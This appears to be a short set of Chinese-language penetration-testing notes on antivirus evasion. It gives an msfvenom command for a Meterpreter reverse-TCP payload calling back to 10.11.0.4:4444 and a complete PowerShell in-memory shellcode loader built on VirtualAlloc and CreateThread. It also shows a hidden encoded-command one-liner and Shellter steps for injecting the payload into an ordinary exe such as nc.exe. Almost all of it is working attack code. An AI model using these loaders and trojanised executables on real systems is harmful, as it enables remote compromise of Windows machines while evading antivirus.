# PowerShell 内存注入

1. 编译powershell payload
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.0.4 LPORT=4444 -f powershell
```

2. ps脚本
```
$code = '
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

[DllImport("msvcrt.dll")]
public static extern IntPtr memset(IntPtr dest, uint src, uint count);';

$winFunc = Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru;

[Byte[]];
[Byte[]] $sc = [第一步生成的payload放在这里，不包括中括号]

$size = 0x1000;

if ($sc.Length -gt 0x1000) {$size = $sc.Length};

$x = $winFunc::VirtualAlloc(0,$size,0x3000,0x40);

for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};

$winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };
```

3. 传送到windows，执行

```
.\av_test.ps1
```

4. 一行powershell执行

> 4.1 用[这个](https://github.com/darkoperator/powershell_scripts/blob/master/ps_encoder.py)py脚本加密
> 4.2 执行 ```python2 ps_encoder.py -s av_test.ps1```
> 4.3 上面生成的加密字符串使用下面命令执行
```
powershell -nop -w hidden -encodedcommand [这里是base64加密字符串，不包括中括号]
```


# shellter

我理解就是把payload注入到正常的exe文件中

1. 安装
```
sudo apt install shellter
apt install wine
```

2. 运行
```
shellter
```

按提示加载需要注入payload 的exe程序，比如nc.exe
选择反弹的payload，比如Meterpreter
选择反弹的LHOST和LPORT

3. 把注入的exe文件传到靶机，双击执行，一般可以绕过反病毒软件

